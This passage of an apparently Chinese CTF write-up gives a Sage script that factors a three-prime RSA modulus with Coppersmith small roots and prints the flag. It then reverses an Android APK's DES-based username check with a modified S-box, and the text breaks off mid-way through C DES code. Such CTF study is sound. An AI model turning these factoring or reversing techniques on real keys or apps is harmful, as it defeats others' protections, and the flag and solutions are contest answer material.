<p>其中<svg xmlns="http://www.w3.org/2000/svg" width="5.467ex" height="1.464ex" viewBox="0 -442 2416.3 647" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" style=""><defs><path id="MJX-5-TEX-I-1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path><path id="MJX-5-TEX-N-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path><path id="MJX-5-TEX-I-1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-5-TEX-I-1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><use xlink:href="#MJX-5-TEX-I-1D465"></use></g><g data-mml-node="mo" transform="translate(572, 0)"><use xlink:href="#MJX-5-TEX-N-2C"></use></g><g data-mml-node="mi" transform="translate(1016.7, 0)"><use xlink:href="#MJX-5-TEX-I-1D466"></use></g><g data-mml-node="mo" transform="translate(1506.7, 0)"><use xlink:href="#MJX-5-TEX-N-2C"></use></g><g data-mml-node="mi" transform="translate(1951.3, 0)"><use xlink:href="#MJX-5-TEX-I-1D467"></use></g></g></g></svg>为小量，我们可以打copper得到<svg xmlns="http://www.w3.org/2000/svg" width="5.467ex" height="1.464ex" viewBox="0 -442 2416.3 647" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" style=""><defs><path id="MJX-5-TEX-I-1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path><path id="MJX-5-TEX-N-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path><path id="MJX-5-TEX-I-1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-5-TEX-I-1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><use xlink:href="#MJX-5-TEX-I-1D465"></use></g><g data-mml-node="mo" transform="translate(572, 0)"><use xlink:href="#MJX-5-TEX-N-2C"></use></g><g data-mml-node="mi" transform="translate(1016.7, 0)"><use xlink:href="#MJX-5-TEX-I-1D466"></use></g><g data-mml-node="mo" transform="translate(1506.7, 0)"><use xlink:href="#MJX-5-TEX-N-2C"></use></g><g data-mml-node="mi" transform="translate(1951.3, 0)"><use xlink:href="#MJX-5-TEX-I-1D467"></use></g></g></g></svg>分解<svg xmlns="http://www.w3.org/2000/svg" width="1.357ex" height="1.025ex" viewBox="0 -442 600 453" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" style=""><defs><path id="MJX-6-TEX-I-1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><use xlink:href="#MJX-6-TEX-I-1D45B"></use></g></g></g></svg></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">n = <span class="number">5605777780127871552103278440489930168557569118966981388111283042550796167470265465148458919374665519335013101681890408413810351780671950283765145543168779446153786190869731166707967097095246677053262868926963631796027692694223765625053269102325714361312299011876036815423751522482629914361369303649193526946050137701205931577449326939722902280884984494828850611521784382097900268639648421100760612558110614208245291400961758972415881709281708443424129033685255718996719201537066717587527029554871540574867831957154286334639399985379381455084604901293000229526196544921067214723085504463673412082637877637982771445298815007769526806112008703908400170846707986989384244531990469279604588770393462375930699135443458952703826608237292999895910024613311408883134789788541751697007502656798556053417265191533053158952284994030769145926816478390761642058013769635850833893158830591398862163134753203291719549474871116653745337968227</span></span><br><span class="line">R.&lt;x,y,z&gt;=Zmod(n)[]</span><br><span class="line">n_ = <span class="built_in">int</span>(gmpy2.iroot(n, <span class="number">3</span>)[<span class="number">0</span>])</span><br><span class="line">t = <span class="number">2</span> ^ <span class="number">3</span></span><br><span class="line">P = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(t):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">            f = (n_ + t * x + i) * (n_ + t * y + j) * (n_ + t * z + k)</span><br><span class="line">            s = <span class="number">342</span></span><br><span class="line">            roots = small_roots(f, [<span class="number">2</span> ^ s, <span class="number">2</span> ^ s, <span class="number">2</span> ^ s], m=<span class="number">1</span>, d=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">if</span> roots:</span><br><span class="line">                a, b, c = [<span class="built_in">int</span>(ii) * t + jj <span class="keyword">if</span> <span class="built_in">int</span>(ii).bit_length() &lt;= <span class="number">512</span> <span class="keyword">else</span> <span class="built_in">int</span>(n - ii) * t - jj <span class="keyword">for</span> ii, jj <span class="keyword">in</span> <span class="built_in">zip</span>(roots[<span class="number">0</span>], [i, j, k])]</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> [a, b, c]:</span><br><span class="line">                    p = n_ + l</span><br><span class="line">                    <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">                        P.append(p)</span><br><span class="line">                    p = n_ - l</span><br><span class="line">                    <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">                        P.append(p)</span><br><span class="line">p, q, r = <span class="built_in">set</span>(P)</span><br><span class="line">d = inverse(<span class="number">65537</span>, (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (r - <span class="number">1</span>))</span><br><span class="line">c = <span class="number">2998195560453407057321637509862236387961676411996988529185696118404592349869917006166370346762261303282478779647282039317061146533808487789458703169149689179547543732935053220010550004328207373171271534689897340156346458951776319267981966893926724550629182100766890856964207263709029611781806548130358294543573874132473259788387939849997550651614987993962540192023207354839106090274252125961835070701748643163379053118598595995782448140944376681636633592442158453965800439960134688017496184195454406927204485213436540382637720118180670197194949275760000729877093621741313147190401896114633643891311672542703928421032698499968701052818985292683628072129271790220674145955527935027879112279336148316425115255710066132502392447843608711463775710558880259205308541126041959858947252063815158749021817255637836170676726466347847422352280599210078359786387419424076245960344657767332883964636288493649066530215094453490169688507988</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure>

<p>获得flag：</p>
<p>flag{24e33eda-f57c-42da-92c5-e0b39414cded}</p>
<h2 id="skip"><a href="#skip" class="headerlink" title="skip"></a>skip</h2><p><strong>[题目writeup]：</strong></p>
<a class="btn-beautify " target="_blank" rel="noopener" href="https://video.bbling.cc/wp%E6%98%A5%E7%A7%8B%E6%9D%AF2024/skip.zip" title="点击下载题文件"><span>点击下载题文件</span></a>



<p><img src="https://bu.dusays.com/2025/01/20/678e53e786a83.webp"></p>
<p>jadx打开apk开始分析</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e5403e1785.webp"></p>
<p>我们可以看到有checkusrname和checkpass分别对username和password进行校验，其中username作为密钥加密password，所以我们先看username，checkusrname在native层</p>
<p>ida打开so文件</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e54637e493.webp"></p>
<p>可以看出是des加密，魔改了s盒</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e547c27339.webp"></p>
<p><img src="https://bu.dusays.com/2025/01/20/678e549e2dda3.webp"></p>
<p>拿出密文，密钥和s盒解密即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">/*--------------------------------------------------------------------------------------------------------------*/</span><br><span class="line">typedef unsigned char ubyte;</span><br><span class="line">/*--------------------------------------------------------------------------------------------------------------*/</span><br><span class="line"><span class="comment">#define KEY_LEN 8</span></span><br><span class="line">typedef ubyte key_t[KEY_LEN];</span><br><span class="line">/*--------------------------------------------------------------------------------------------------------------*/</span><br><span class="line">const static ubyte PC1[] = &#123;</span><br><span class="line"> <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,  <span class="number">9</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line"> <span class="number">10</span>,  <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line"> <span class="number">19</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line"> <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line"> <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line"> <span class="number">14</span>,  <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line"> <span class="number">21</span>, <span class="number">13</span>,  <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>,  <span class="number">4</span></span><br><span class="line">&#125;;</span><br><span 